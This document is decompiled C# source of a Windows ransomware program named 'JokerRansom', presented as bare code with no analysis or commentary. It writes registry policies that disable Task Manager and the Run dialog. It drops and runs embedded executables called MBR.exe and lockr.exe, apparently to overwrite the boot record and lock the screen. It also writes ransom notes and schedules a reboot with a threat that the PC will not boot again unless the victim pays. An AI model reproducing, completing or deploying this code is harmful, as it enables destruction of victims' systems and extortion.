using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using JokerRansom.My;
using JokerRansom.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace JokerRansom;

[StandardModule]
internal sealed class Module1
{
	private static object RegistryKey;

	[STAThread]
	public static void Main()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 630:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0025;
						case 4:
							goto IL_005b;
						case 5:
							goto IL_0076;
						case 6:
							goto IL_00ac;
						case 7:
							goto IL_00c7;
						case 8:
							goto IL_00fd;
						case 9:
							goto IL_0127;
						case 10:
							goto IL_014e;
						case 11:
							goto IL_0179;
						case 12:
							goto IL_01a0;
						case 13:
							goto IL_01ad;
						case 14:
							goto IL_01d8;
						case 15:
							goto IL_01ea;
						case 16:
							goto IL_01f7;
						case 17:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 18:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_01f7:
					num = 16;
					Interaction.Shell("notepad.exe c:\\JokerRansomReadme.txt", (AppWinStyle)3, false, -1);
					break;
					IL_01ea:
					num = 15;
					Thread.Sleep(5000);
					goto IL_01f7;
					IL_000a:
					num = 2;
					RegistryKey = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Wscript.shell", ""));
					goto IL_0025;
					IL_0025:
					num = 3;
					NewLateBinding.LateCall(RegistryKey, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, true);
					goto IL_005b;
					IL_005b:
					num = 4;
					RegistryKey = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Wscript.shell", ""));
					goto IL_0076;
					IL_0076:
					num = 5;
					NewLateBinding.LateCall(RegistryKey, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, true);
					goto IL_00ac;
					IL_00ac:
					num = 6;
					RegistryKey = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Wscript.shell", ""));
					goto IL_00c7;
					IL_00c7:
					num = 7;
					NewLateBinding.LateCall(RegistryKey, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableCMD", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, true);
					goto IL_00fd;
					IL_00fd:
					num = 8;
					File.WriteAllBytes(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\MBR.exe", Resources.MBR);
					goto IL_0127;
					IL_0127:
					num = 9;
					Process.Start(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\MBR.exe");
					goto IL_014e;
					IL_014e:
					num = 10;
					File.WriteAllBytes(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\lockr.exe", Resources.lockr);
					goto IL_0179;
					IL_0179:
					num = 11;
					Process.Start(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\lockr.exe");
					goto IL_01a0;
					IL_01a0:
					num = 12;
					Thread.Sleep(5000);
					goto IL_01ad;
					IL_01ad:
					num = 13;
					File.WriteAllBytes(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\JokerRansomReadMe.txt", Resources.note);
					goto IL_01d8;
					IL_01d8:
					num = 14;
					File.WriteAllBytes("c:\\JokerRansomReadMe.txt", Resources.note);
					goto IL_01ea;
					end_IL_0001_2:
					break;
				}
				num = 17;
				Interaction.Shell("shutdown.exe /r /t 3600 /c \"you have only a hour to pay Or your PC won't boot again\" ", (AppWinStyle)3, false, -1);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 630;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
